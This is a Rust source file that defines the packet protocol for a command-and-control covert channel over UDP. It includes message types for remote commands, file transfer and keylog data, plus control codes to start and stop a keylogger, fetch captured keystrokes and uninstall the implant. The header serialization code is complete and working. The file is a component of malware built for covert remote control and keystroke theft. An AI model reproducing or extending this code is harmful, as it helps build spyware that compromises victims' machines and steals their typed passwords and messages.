/// Application-layer protocol for C2 covert channel.
/// All protocol data lives in UDP PAYLOAD only.

use uuid::Uuid;

// Packet types
pub const PACKET_TYPE_MESSAGE: u8 = 1;
pub const PACKET_TYPE_ACK: u8 = 2;
pub const PACKET_TYPE_HEARTBEAT: u8 = 3;
pub const PACKET_TYPE_CMD: u8 = 4;
pub const PACKET_TYPE_CMD_RESP: u8 = 5;
pub const PACKET_TYPE_FILE: u8 = 6;
pub const PACKET_TYPE_KEYLOG: u8 = 7;
pub const PACKET_TYPE_CTRL: u8 = 8;

// Control subtypes for PACKET_TYPE_CTRL
pub const CTRL_START_KEYLOGGER: u8 = 1;
pub const CTRL_STOP_KEYLOGGER: u8 = 2;
pub const CTRL_REQUEST_KEYLOG: u8 = 3;
pub const CTRL_UNINSTALL: u8 = 4;

// Fixed 32-byte header in UDP payload
pub const HEADER_SIZE: usize = 32;

#[derive(Debug, Clone, Copy)]
pub struct PacketHeader {
    pub message_id: [u8; 16],
    pub packet_type: u8,
    pub subtype: u8,
    pub content_length: u32,
    pub sequence: u16,
    pub flags: u16,
}

impl PacketHeader {
    pub fn new(ptype: u8, subtype: u8, content: &str) -> Self {
        Self {
            message_id: Uuid::new_v4().as_bytes().to_owned(),
            packet_type: ptype,
            subtype,
            content_length: content.len() as u32,
            sequence: 0,
            flags: 0,
        }
    }

    pub fn new_ctrl(subtype: u8) -> Self {
        Self {
            message_id: Uuid::new_v4().as_bytes().to_owned(),
            packet_type: PACKET_TYPE_CTRL,
            subtype,
            content_length: 0,
            sequence: 0,
            flags: 0,
        }
    }

    pub fn new_ack(message_id: [u8; 16]) -> Self {
        Self {
            message_id,
            packet_type: PACKET_TYPE_ACK,
            subtype: 0,
            content_length: 0,
            sequence: 0,
            flags: 0,
        }
    }

    pub fn new_heartbeat() -> Self {
        Self {
            message_id: [0u8; 16],
            packet_type: PACKET_TYPE_HEARTBEAT,
            subtype: 0,
            content_length: 0,
            sequence: 0,
            flags: 0,
        }
    }

    pub fn to_bytes(&self) -> [u8; HEADER_SIZE] {
        let mut b = [0u8; HEADER_SIZE];
        b[0..16].copy_from_slice(&self.message_id);
        b[16] = self.packet_type;
        b[17] = self.subtype;
        b[18..22].copy_from_slice(&self.content_length.to_le_bytes());
        b[22..24].copy_from_slice(&self.sequence.to_le_bytes());
        b[24..26].copy_from_slice(&self.flags.to_le_bytes());
        b[26..32].fill(0);
        b
    }

    pub fn from_bytes(bytes: &[u8]) -> Option<Self> {
        if bytes.len() < HEADER_SIZE { return None; }
        Some(Self {
            message_id: bytes[0..16].try_into().ok()?,
            packet_type: bytes[16],
            subtype: bytes[17],
            content_length: u32::from_le_bytes(bytes[18..22].try_into().ok()?),
            sequence: u16::from_le_bytes(bytes[22..24].try_into().ok()?),
            flags: u16::from_le_bytes(bytes[24..26].try_into().ok()?),
        })
    }

    pub fn correlate(&self, other: &Self) -> bool {
        self.message_id == other.message_id
    }
}
